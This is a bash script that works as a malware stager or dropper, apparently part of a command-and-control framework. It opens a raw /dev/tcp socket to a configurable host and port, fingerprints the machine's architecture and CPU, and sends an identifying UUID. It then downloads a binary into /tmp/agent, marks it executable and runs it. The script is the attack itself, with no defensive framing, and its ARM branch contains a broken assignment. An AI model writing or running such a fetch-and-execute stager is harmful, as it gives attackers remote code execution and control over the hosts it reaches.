#!/bin/bash

port=4153 #MAKE DYNAMIC
host=127.0.0.1 #MAKE DYNAMIC
channel="/dev/tcp/$host/$port"
outputfile="/tmp/agent" #MAKE DYNAMIC

#Padding and name
padding="\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x27"
name="39519bc2-9c07-4e76-8774-0554edcaf7c4" #MAKE DYNAMIC
OS="L"

if [[ $(uname -m) == x86_64 ]]; then
    ARCH="6"
else
    ARCH="3"
fi

if $(cat /proc/cpuinfo |grep -q 'Intel'); then
    PROC="I"
elif $(cat /proc/cpuinfo |grep -q 'ARM'); then
    PROC+"A"
elif $(cat /proc/cpuinfo |grep -q 'MIPS'); then
    PROC="M"
fi

fullname="${padding}${name}${OS}${ARCH}${PROC}"

#Start a bi-directional socket
exec 3<>$channel

#Send 8 bytes and UUID name of dropper
echo -ne $fullname >&3

cat <&3 >$outputfile

chmod +x $outputfile
exec $outputfile